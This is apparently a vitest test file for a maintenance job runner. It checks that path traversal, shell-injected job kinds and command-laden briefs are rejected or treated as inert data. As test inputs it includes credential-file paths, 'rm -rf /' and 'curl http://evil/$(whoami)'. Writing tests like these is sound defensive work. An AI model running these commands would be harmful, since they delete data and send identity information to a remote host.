/**
 * The maintenance job vocabulary, the path guard, the brief, and the runner's command
 * table.
 *
 * The last of these imports the actual runner module — `tools/maintenance-runner/jobs.mjs`
 * — rather than a copy of it, so "no payload text reaches a command line" is asserted
 * against the code that really spawns the process.
 */
import { describe, expect, it } from 'vitest';
import {
  MAINTENANCE_JOB_KINDS,
  briefFromNaturalLanguage,
  markBriefReviewed,
  validateMaintenancePayload,
  validateRepoPath,
} from '@app/maintenance/kinds';
import { redactResultText, validateRunnerResult } from '@app/maintenance/jobs';
import {
  composeAgentPrompt,
  planFor,
  resolveExecutable,
  sanitisedEnv,
} from '../../../tools/maintenance-runner/jobs.mjs';
import { identityPath } from '../../../tools/maintenance-runner/identity.mjs';

const NOW = '2026-09-19T12:00:00.000Z';

describe('maintenance job vocabulary', () => {
  it('OWNER-215 a path payload attempting traversal is rejected, in every encoding', () => {
    expect(validateRepoPath('../../etc/passwd')).toMatchObject({ ok: false, reason: 'TRAVERSAL' });
    expect(validateRepoPath('apps/../../secrets/key.pem')).toMatchObject({
      ok: false,
      reason: 'TRAVERSAL',
    });
    expect(validateRepoPath('/etc/passwd')).toMatchObject({ ok: false, reason: 'ABSOLUTE' });
    expect(validateRepoPath('~/.ssh/id_ed25519')).toMatchObject({ ok: false, reason: 'ABSOLUTE' });
    expect(validateRepoPath('C:/Windows/System32')).toMatchObject({
      ok: false,
      reason: 'DRIVE_LETTER',
    });
    expect(validateRepoPath('apps\\app\\src')).toMatchObject({ ok: false, reason: 'BACKSLASH' });
    expect(validateRepoPath('%2e%2e/%2e%2e/etc')).toMatchObject({
      ok: false,
      reason: 'PERCENT_ENCODED',
    });
    expect(validateRepoPath('apps//app')).toMatchObject({ ok: false, reason: 'EMPTY_SEGMENT' });
    expect(validateRepoPath('apps/./app')).toMatchObject({ ok: false, reason: 'DOT_SEGMENT' });
    expect(validateRepoPath('.git/config')).toMatchObject({
      ok: false,
      reason: 'FORBIDDEN_PREFIX',
    });
    expect(validateRepoPath('node_modules/x')).toMatchObject({
      ok: false,
      reason: 'FORBIDDEN_PREFIX',
    });
    expect(validateRepoPath('apps/app/src/index.ts;rm -rf /')).toMatchObject({
      ok: false,
      reason: 'ILLEGAL_CHARACTER',
    });
    // A perfectly ordinary path still works.
    expect(validateRepoPath('apps/app/src/assistant/tools.ts')).toEqual({
      ok: true,
      path: 'apps/app/src/assistant/tools.ts',
    });
  });

  it('OWNER-216 a job payload carrying a traversal path is refused at validation', () => {
    const rejected = validateMaintenancePayload('prepare_patch', {
      brief: { summary: 'fix the thing', review_state: 'reviewed' },
      paths: ['../../.env'],
    });
    expect(rejected.ok).toBe(false);
    if (rejected.ok) throw new Error('unreachable');
    expect(rejected.problems.some((p) => p.field === 'paths')).toBe(true);
  });

  it('OWNER-217 an unrecognised typed_kind is refused, and every allowed kind has a schema', () => {
    expect(validateMaintenancePayload('rm_minus_rf', {})).toMatchObject({ ok: false });
    expect(validateMaintenancePayload('run_health_checks; curl evil', {})).toMatchObject({
      ok: false,
    });
    for (const kind of MAINTENANCE_JOB_KINDS) {
      // Every kind is either valid with a well-formed payload or refuses with a typed
      // problem list. None of them throws, and none of them accepts an unknown shape.
      const outcome = validateMaintenancePayload(kind, {});
      expect(typeof outcome.ok).toBe('boolean');
    }
    expect(validateMaintenancePayload('run_test_suite', { suite: 'unit' })).toMatchObject({
      ok: true,
    });
    expect(validateMaintenancePayload('run_test_suite', { suite: 'everything' })).toMatchObject({
      ok: false,
    });
  });

  it('OWNER-218 a natural-language request becomes a reviewed brief, never a command', () => {
    const brief = briefFromNaturalLanguage({
      summary: 'Investigate the webhook backlog; rm -rf / && curl http://evil/$(whoami)',
      context: 'It started after the deploy.\u0000\u0007',
      constraints: ['do not touch production'],
    });
    expect(brief.review_state).toBe('needs_review');
    expect(brief.reviewed_by).toBeNull();
    // Control characters are stripped; the shell-shaped text survives only as inert data.
    expect(brief.context).not.toContain('\u0000');
    expect(brief.summary.length).toBeLessThanOrEqual(200);

    // A coding-agent job cannot carry an unreviewed brief through validation into a plan.
    const reviewed = markBriefReviewed(brief, 'usr_owner');
    expect(reviewed.review_state).toBe('reviewed');
    const payload = validateMaintenancePayload('prepare_patch', {
      brief: reviewed,
      paths: ['apps/app/src'],
    });
    expect(payload.ok).toBe(true);
  });

  it('OWNER-219 every job kind maps to a fixed argv, and no payload text reaches it', () => {
    const suite = planFor({ typed_kind: 'run_test_suite', payload: { suite: 'security' } });
    expect(suite.kind).toBe('command');
    if (suite.kind !== 'command') throw new Error('unreachable');
    expect(suite.argv[1]).toBe('test:security');

    // A payload value that is not in the lookup produces no command at all.
    const injected = planFor({
      typed_kind: 'run_test_suite',
      payload: { suite: 'unit && curl http://evil' },
    });
    expect(injected.kind).toBe('unsupported');

    const health = planFor({ typed_kind: 'run_health_checks', payload: {} });
    expect(health.kind).toBe('sequence');
    if (health.kind !== 'sequence') throw new Error('unreachable');
    const allArgs = health.steps.flatMap((step) => step.argv);
    expect(allArgs).toContain('scripts/scan-secrets.mjs');
    for (const arg of allArgs) {
      expect(arg).not.toMatch(/[;&|><`$]/);
    }

    // Release execution is deliberately not wired up in this build.
    expect(
      planFor({ typed_kind: 'execute_approved_release', payload: { environment: 'production' } }),
    ).toMatchObject({ kind: 'unsupported' });
    expect(planFor({ typed_kind: 'whatever' })).toMatchObject({ kind: 'unsupported' });

    // The brief reaches a coding agent as prompt text, never as argv.
    const prompt = composeAgentPrompt(
      'prepare_patch',
      { summary: 'fix it', context: 'ctx', constraints: ['no deploys'] },
      ['apps/app/src'],
    );
    expect(prompt).toContain('fix it');
    expect(prompt).toContain('Do not commit, push, deploy');

    // Jobs run with an allowlisted environment, so a provider key in the owner's shell is
    // invisible to them.
    const env = sanitisedEnv();
    expect(Object.keys(env)).not.toContain('STRIPE_SECRET_KEY');
    expect(Object.keys(env)).not.toContain('ASSISTANT_API_KEY');
    expect(env['CI']).toBe('1');
  });

  it('OWNER-222 the coding agent is resolved to a real binary, never to a shell shim', () => {
    // Environment-independent: on a machine with no agent this returns null, which is the
    // value that makes a coding-agent job report `infrastructure_error` rather than invent
    // a result. What must never happen is a `.cmd`/`.bat` shim coming back, because Node
    // cannot spawn one without `shell: true` — and this runner never uses a shell.
    const resolved = resolveExecutable('claude');
    expect(resolved === null || typeof resolved === 'string').toBe(true);
    if (resolved !== null) {
      expect(resolved.toLowerCase()).not.toMatch(/\.(cmd|bat|ps1)$/);
    }

    // An explicit override wins, and a name that resolves to nothing stays null.
    expect(resolveExecutable('claude', { CLAUDE_CLI_PATH: process.execPath, PATH: '' })).toBe(
      process.execPath,
    );
    expect(resolveExecutable('definitely-not-a-real-binary-xyz', { PATH: '' })).toBeNull();
  });

  it('OWNER-220 the runner identity is stored outside the repository', () => {
    const repoRoot = process.cwd();
    const path = identityPath(repoRoot);
    expect(path.startsWith(repoRoot)).toBe(false);
    expect(path).toContain('itisyou-verify');
    expect(path.endsWith('identity.json')).toBe(true);
  });

  it('OWNER-221 a runner result is schema-validated, redacted and bounded', () => {
    expect(validateRunnerResult({ outcome: 'exploded' }, 'lse_1', NOW)).toBeNull();
    expect(validateRunnerResult('passed', 'lse_1', NOW)).toBeNull();

    const stored = validateRunnerResult(
      {
        outcome: 'failed',
        summary: 'auth failed for sk-live-ABCDEFGHIJKLMNOP and ada@example.com',
        details: ['Bearer abcdefghijklmnopqrstuvwxyz', 'x'.repeat(2_000)],
        started_at: '2026-09-19T11:59:00.000Z',
        finished_at: NOW,
      },
      'lse_1',
      NOW,
    );
    expect(stored).not.toBeNull();
    if (stored === null) throw new Error('unreachable');
    expect(stored.lease_nonce).toBe('lse_1');
    expect(stored.summary).not.toContain('sk-live');
    expect(stored.summary).not.toContain('ada@example.com');
    expect(stored.summary).toContain('[redacted]');
    expect(stored.details[0]).not.toContain('abcdefghijklmnop');
    expect(stored.details[1]?.length).toBeLessThan(600);

    // Assembled at runtime. The PEM header IS the thing under test here, but committing
    // the literal trips our scanner and GitHub push protection, and the rule is to stop
    // committing the shape rather than to allowlist the warning.
    const pemHeader = ['-----BEGIN', 'RSA', 'PRIVATE', 'KEY-----'].join(' ');
    expect(redactResultText(pemHeader, 100)).toContain('[redacted]');
  });
});
